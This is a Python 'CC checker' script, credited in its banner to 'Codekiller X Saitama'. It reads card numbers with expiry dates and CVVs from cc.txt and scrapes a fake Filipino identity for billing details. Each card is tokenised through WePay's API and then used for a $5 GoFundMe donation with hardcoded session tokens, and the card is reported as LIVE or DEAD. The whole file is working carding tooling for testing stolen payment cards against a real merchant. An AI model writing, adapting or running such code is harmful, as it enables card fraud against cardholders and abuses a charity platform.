from colorama import Fore, init
from bs4 import BeautifulSoup
import time
import requests
import json
import threading
import hashlib
import random


init()

def check_the_creditCard(credit_card, api='1'): # Default to WePAY
    ccNum, ccMonth, ccYear, CcCvv = credit_card.split('|')
    ccNum = ccNum.replace(' ', '')
    ccMonth = ccMonth.replace(' ', '')
    ccYear = ccYear.replace(' ', '')
    CcCvv = CcCvv.replace(' ', '')

    if ccNum == "":
        return "Credit Card Error"
    if ccMonth == "":
        return "Credit Card Error"
    if ccYear == "":
        return "Credit Card Error"
    if CcCvv == "":
        return "Credit Card Error"

    data = requests.get("https://fauxid.com/fake-name-generator/philippines?age=25-34&gender=male")
    dd = BeautifulSoup(data.text, 'html.parser')
    name = dd.find('span', {'class': 'id_name'}).get_text()
    name_ = name.split(' ')
    nameLength = len(name_)

    if nameLength == 4:
        firstName, lastName = name_[1], name_[3]
    elif nameLength == 2:
        firstName, lastName = name_[0], name_[1]
    else:
        firstName, lastName = name_[0], name_[1]


    address = dd.find('address', {'class': 'can-copy'}).text.replace('\n', '')
    address = address.split(',')
    try:
        Street = address[0] + address[1] + address[2]
        address2 = address[2].split(' ')
    except:
        Street = address[0]
        address2 = address[1].split(' ')

    def hasNumbers(inputString):
        return any(char.isdigit() for char in inputString)

    if hasNumbers(address2[2]):
        Postal = address2[2]
        City = address2[1]

        try:
            Region = address2[3] + address2[4]
        except:
            Region = address2[3]

    else:
        Postal = address2[3]
        City = address2[1] + ' ' + address2[2]

        try:
            Region = address2[4] + address2[5]
        except:
            Region = address2[4]



    def wepayapi_powered():
        wePayApi = "https://www.wepayapi.com/v2/credit_card/create"
        goFundMe = "https://www.gofundme.com/mvc.php?route=customcheckout/customCheckout"

        if ccNum[0] == "4":
            cctype = "visa"
        else:
            cctype = "mastercard"

        wePayApi_Data = {
            "client_id":"90823",
            "cc_number": ccNum,
            "cvv": CcCvv,
            "expiration_month":ccMonth,
            "expiration_year":ccYear[2:],
            "user_name":firstName + ' ' + lastName,
            "email":"lancebuan@gmail.com",
            "address":
                {
                    "address1":Street,
                    "city":City,
                    "region":Region,
                    "country":"PH",
                    "postal_code":Postal
                },
            "reference_id":"48af75dff9ab404f8508eb0f6e013a203c83dac1",
            "device_token":"29449342-ae90-429b-8449-0688e5a24148"
            }


        wePay_response = requests.post(wePayApi, json=wePayApi_Data)
        wePay_response = json.loads(wePay_response.text)
        try:
            if wePay_response['state'] == "new":
                cc_id = wePay_response['credit_card_id']
            else:
                cc_id = "ERROR"
        except KeyError:
            return "Credit Card Error"

        gofundme_data = "donationAmount=5&donationTipAmount=1&donationAnonymous=&donorFirstName=Lance&donorLastName=Buan&donorEmail=lancebuan%40gmail.com&donorAddressStreet=&donorAddressStreet2=&donorAddressCity=&donorAddressState=&donorAddressRegion=&donorAddressCountryCode=PH&donorAddressZip=3100&donorAddressPostcode=&emailList=&donationTipOtherAmount=&entered_zip=1216&donorAddressProvince=&teamMemberId=0&gfm_idcode=58355202da94789c3e03a2c534163c6c&fingerprints=%7B%22fingerprints%22%3A%5B%2258355202da94789c3e03a2c534163c6c%22%5D%2C%22userAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+6.1%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F74.0.3729.169+Safari%2F537.36%22%7D&_token=1d8559b30676003109f201370930f778&billingCcExpiration=&reference_id=48af75dff9ab404f8508eb0f6e013a203c83dac1&fundId=34961668&ccInfo%5Bcredit_card_id%5D=" + str(cc_id) + "&ccInfo%5Bstate%5D=new&persistShortTermToken=false&savedToken=false&Donations=true&FBLogin%5Buid%5D=&FBLogin%5Btoken%5D=&content=&gfmFlow=d_ab_c1h&Comments%5Btext%5D=&donationtier_id=&credit_card_number=3016&credit_card_type=" + cctype + "&sid=IlX2laVLP4KBzgq88Bejb9jJDXK135OO9zSThVsQ%2FP8%3D"
        gofundme_response = requests.post(goFundMe, data=gofundme_data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        result = json.loads(gofundme_response.text)
        
        if result["success"]:
            print(Fore.LIGHTGREEN_EX + "LIVE" + Fore.RESET + " => " + Fore.LIGHTGREEN_EX + credit_card + Fore.RESET + "\t[Charge: " + Fore.GREEN + "$5"+ Fore.RESET +"]")
        else:
            print(Fore.LIGHTRED_EX + "DEAD" + Fore.RESET + " => " + Fore.LIGHTRED_EX + credit_card + Fore.RESET + "\t[Reason: " + Fore.RED + result['message'] + Fore.RESET + "]")

def gateway1():
    print(Fore.LIGHTYELLOW_EX + "[~] Checking Start")
    threads = []
    with open('cc.txt', 'r') as f:
        credit_cards = f.read()
        for cc in credit_cards.split('\n'):
            result = threading.Thread(target=check_the_creditCard, args=(cc,))
            threads.append(result)

        for x in threads:
            x.start()
            x.join()

        print(Fore.GREEN + "[+] Done Checking " + str(len(credit_cards.split('\n'))))
gateway1()

def main():
    banner = f"""   
{Fore.RED}  _|_|_|  _|    _|{Fore.YELLOW}            {Fore.RED}  _|_|_|{Fore.GREEN}  _|                            {Fore.RED}_|    _|{Fore.GREEN}                      
{Fore.RED}_|        _|  _|  {Fore.YELLOW}            {Fore.RED}_|      {Fore.GREEN}  _|_|_|      _|_|      _|_|_|  {Fore.RED}_|  _|  {Fore.GREEN}    _|_|    _|  _|_|  
{Fore.RED}_|        _|_|    {Fore.YELLOW}_|_|_|_|_|  {Fore.RED}_|      {Fore.GREEN}  _|    _|  _|_|_|_|  _|        {Fore.RED}_|_|    {Fore.GREEN}  _|_|_|_|  _|_|      
{Fore.RED}_|        _|  _|  {Fore.YELLOW}            {Fore.RED}_|      {Fore.GREEN}  _|    _|  _|        _|        {Fore.RED}_|  _|  {Fore.GREEN}  _|        _|        
{Fore.RED}  _|_|_|  _|    _|{Fore.YELLOW}            {Fore.RED}  _|_|_|{Fore.GREEN}  _|    _|    _|_|_|    _|_|_|  {Fore.RED}_|    _|{Fore.GREEN}    _|_|_|  _|
                            {Fore.LIGHTYELLOW_EX}[Created by Codekiller X Saitama]
                            {Fore.LIGHTYELLOW_EX}     [Merchant: GoFundMe]
"""
    print(banner)
    print()
    print("[NOTE] PLEASE MAKE A NEW TEXT FILE NAMED 'cc.txt' AND PLACE ALL THE CC TO CHECK ON IT")
    print("PRESS ANY KEY TO CONTINUE")
    input()
    gateway1()

if __name__ == "__main__":
    main()
